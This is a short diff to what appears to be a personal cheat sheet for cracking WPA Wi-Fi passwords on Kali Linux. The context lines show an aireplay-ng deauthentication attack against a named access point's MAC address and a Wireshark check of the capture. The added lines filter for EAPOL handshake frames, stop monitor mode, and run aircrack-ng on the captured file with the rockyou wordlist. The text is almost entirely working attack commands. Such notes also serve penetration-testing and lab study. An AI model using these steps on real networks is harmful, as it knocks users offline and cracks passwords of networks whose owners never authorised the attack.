@@ -34,3 +34,12 @@ sudo aireplay-ng --deauth 0 -a 90:9A:4A:B8:F3:FB wlan0mon
 !Use Wireshark to open hack file
 wireshark hack1-01.cap
 !Filter Wireshark messages for EAPOL
+eapol
+
+!Stop monitor mode
+airmon-ng stop wlan0mon
+
+!Crack file with Rock you or another wordlist
+Make sure you have rockyou in text format (unzip file on Kali)
+!Replace hack1-01.cap with your file name
+aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt
